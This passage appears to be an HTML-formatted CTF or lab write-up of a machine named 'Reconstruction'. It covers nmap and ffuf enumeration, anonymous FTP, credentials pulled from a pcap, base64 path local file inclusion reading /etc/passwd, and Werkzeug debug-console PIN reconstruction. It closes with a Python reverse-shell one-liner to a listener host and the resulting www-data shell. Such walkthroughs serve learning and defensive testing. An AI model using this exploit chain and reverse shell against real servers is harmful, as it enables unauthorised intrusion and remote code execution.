&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/services 192.168.59.103
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| drwxr-xr-x    2 0        0            4096 Apr 29  2020 WebSOC
|_-rw-r--r--    1 0        0             137 Apr 29  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.59
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
8080/tcp open  http    syn-ack ttl 63 Werkzeug httpd 1.0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Python 3.6.9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Blog
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are a few &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; services, let’s start with directory enumeration.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ffuf&quot;&gt;&lt;strong&gt;Ffuf&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;We’ll employ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; to gather hidden files and directories.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;For files:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.226.103:8080/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/common.txt
console                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 1985, Words: 411, Lines: 53]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;For directories:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.226.103:8080/FUZZ/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/common.txt
create                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 302, Size: 257, Words: 22, Lines: 4]                                                                                                   
data                    &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 302, Size: 253, Words: 22, Lines: 4]                                                                                                   
drafts                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 302, Size: 257, Words: 22, Lines: 4]                                                                                                   
login                   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 2297, Words: 545, Lines: 76]                                                                                                
&lt;span class=&quot;nb&quot;&gt;logout&lt;/span&gt;                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 2011, Words: 486, Lines: 67] 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The outputs reveal a few interesting entries. Let’s us now focus on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; service.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ftp-enumeration&quot;&gt;&lt;strong&gt;FTP Enumeration&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;With the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous:anonymous&lt;/code&gt; credentials, we successfully log in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt; user.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 192.168.226.103     
Connected to 192.168.226.103.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.226.103:kali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Sep 30  2020 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x    3 0        115          4096 Sep 30  2020 ..
drwxr-xr-x    2 0        0            4096 Apr 29  2020 WebSOC
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;    1 0        0             137 Apr 29  2020 note.txt
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are some interesting shares available for us to futher investigate. We can download them with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get/mget&lt;/code&gt; command.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; get note.txt
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: note.txt remote: note.txt
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;note.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;137 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
137 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;66.0361 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;WebSOC
250 Directory successfully changed.
ftp&amp;gt; mget &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
mget 1.05.2020.pcap? y
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;1.05.2020.pcap &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3086771 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
3086771 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;6.21 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;485.1299 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mget 29.04.2020.pcap? y
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;29.04.2020.pcap &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;869677 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
869677 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.09 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;275.0035 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mget 30.04.2020.pcap? y
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Opening BINARY mode data connection &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;30.04.2020.pcap &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14579662 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
226 Transfer complete.
14579662 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;22.75 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;625.9780 kB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;pcap-enumeration&quot;&gt;&lt;strong&gt;PCAP Enumeration&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;There are three &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; files spotted in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; shares. Each of them performs different attacks replayed by the SOC team. If we look closely, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.05.2020.pcap&lt;/code&gt; file divulges valid credentials for the web application.&lt;/p&gt;

&lt;p&gt;Open the mentioned &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.pcap&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;, the search string is:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http.request.method==POST&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Reconstruction/1.png&quot; title=&quot;Reconstruction/1.png&quot; alt=&quot;Reconstruction/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Follow TCP Stream&lt;/code&gt; of the packet &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5159&lt;/code&gt;, the password is revealed.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Reconstruction/2.png&quot; title=&quot;Reconstruction/2.png&quot; alt=&quot;Reconstruction/2.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;http-enumeration&quot;&gt;&lt;strong&gt;HTTP Enumeration&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Further enumeration, we discover the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/console&lt;/code&gt; let us execute python code, which we can leverage to secure an initial access.&lt;/p&gt;

&lt;p&gt;However, it’s currently protected by a 9-digit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIN&lt;/code&gt; number, an effective security solution to remediate password brute-force attempts.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Reconstruction/3.png&quot; title=&quot;Reconstruction/3.png&quot; alt=&quot;Reconstruction/3.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Conducting a few more investigations, we acknowledge that it’s possible to reconstruct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIN&lt;/code&gt; number if local file inclusion vulnerability is available.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-file-disclosure&quot;&gt;&lt;strong&gt;Local File Disclosure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The password from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pcap&lt;/code&gt; brings us to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data/&lt;/code&gt; directory, which we can’t access in the first place.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Navigate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/data/&lt;/code&gt; dir, it returned &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hello World!&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://192.168.226.103:8080/data/ &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;session=eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.YYhdGQ.-62c3-7tzSkMTMvvyFRaQ6IczPQ&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 192.168.226.103:8080...
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 192.168.226.103 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.226.103&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 8080 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /data/ HTTP/1.1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.226.103:8080
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.74.0
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Cookie: &lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.YYhdGQ.-62c3-7tzSkMTMvvyFRaQ6IczPQ
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Mark bundle as not supporting multiuse
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; HTTP 1.0, assume close after body
&amp;lt; HTTP/1.0 200 OK
&amp;lt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
&amp;lt; Content-Length: 13
&amp;lt; Vary: Cookie
&amp;lt; Set-Cookie: &lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.YYhebg.r49IxaF8LKqT-Ew3s7Vnr71bIso&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Expires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wed, 08-Dec-2021 23:17:02 GMT&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; HttpOnly&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/
&amp;lt; Server: Werkzeug/1.0.1 Python/3.6.9
&amp;lt; Date: Sun, 07 Nov 2021 23:17:02 GMT
Hello World!
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Closing connection 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To enumerate its behaviours, we’ll send some random words.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The belows will demonstrate the idea …&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://192.168.226.103:8080/data/test &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;session=eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.YYhdGQ.-62c3-7tzSkMTMvvyFRaQ6IczPQ&apos;&lt;/span&gt;
...[code snip]...
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /data/test HTTP/1.1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.226.103:8080
...[code snip]...
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
...[code snip]...
&amp;lt; X-Error: &lt;span class=&quot;s1&quot;&gt;&apos;utf-8&apos;&lt;/span&gt; codec can&lt;span class=&quot;s1&quot;&gt;&apos;t decode byte 0xb5 in position 0: invalid start byte
...[code snip]...
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://192.168.226.103:8080/data/test1 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;session=eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.YYhdGQ.-62c3-7tzSkMTMvvyFRaQ6IczPQ&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /data/test1 HTTP/1.1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.226.103:8080
...[code snip]...
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
...[code snip]...
&amp;lt; X-Error: Incorrect padding
...[code snip]...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Noticing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Error&lt;/code&gt; response header, it might ask for a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; encoded input.&lt;/p&gt;

&lt;p&gt;Now, if we send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dGVzdA==&lt;/code&gt; (base64-encoded of “test”) …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://192.168.226.103:8080/data/dGVzdA&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;session=eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.YYhdGQ.-62c3-7tzSkMTMvvyFRaQ6IczPQ&apos;&lt;/span&gt;
...[code snip]...
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /data/dGVzdA&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; HTTP/1.1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 192.168.226.103:8080
...[code snip]...
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
...[code snip]...
&amp;lt; X-Error: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Errno 2] No such file or directory: &lt;span class=&quot;s1&quot;&gt;&apos;test&apos;&lt;/span&gt;
...[code snip]...
Something went wrong! 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No such file ...&lt;/code&gt; response is worth to notice here.&lt;/p&gt;

&lt;p&gt;Similarly, let’s us try sending a base64-encoded of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://192.168.226.103:8080/data/L2V0Yy9wYXNzd2Q&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;session=eyJfcGVyb
WFuZW50Ijp0cnVlLCJsb2dnZWRfaW4iOnRydWV9.YYhdGQ.-62c3-7tzSkMTMvvyFRaQ6IczPQ&apos;&lt;/span&gt;
...[code snip]...
root:x:0:0:root:/root:/bin/bash                                                    
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the output, we successfully include the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file of the target system.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;werkzeug-pin-reconstruction&quot;&gt;&lt;strong&gt;Werkzeug PIN Reconstruction&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;For more information of how to reconstruct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIN&lt;/code&gt; number, we can read &lt;a href=&quot;https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug&quot;&gt;this document&lt;/a&gt; and &lt;a href=&quot;https://ctftime.org/writeup/17955&quot;&gt;this document&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Primarily, the below image will best illustrate our vital changes in the code.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Reconstruction/4.png&quot; title=&quot;Reconstruction/4.png&quot; alt=&quot;Reconstruction/4.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;Try executing the program, we receive a 9-digit figures, which can be used to bypass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PIN&lt;/code&gt; protection.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 pin_generator.py   
287-863-218
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;initial-foothold&quot;&gt;&lt;strong&gt;Initial Foothold&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;At this point, code execution can be accomplished via abusing native &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os&lt;/code&gt; python library.&lt;/p&gt;

&lt;p&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Interactive Console&lt;/code&gt;, we execute the following code to confirm RCE is successfully achieved.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Reconstruction/5.png&quot; title=&quot;Reconstruction/5.png&quot; alt=&quot;Reconstruction/5.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;and the below command to pull off a rev shell.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__import__(&apos;os&apos;).popen(&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.226/80 0&amp;gt;&amp;amp;1&apos;&quot;).read()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After a second, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener should catch a callback as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.226] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.226.103] 34128
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;990&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@reconstruction:~/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

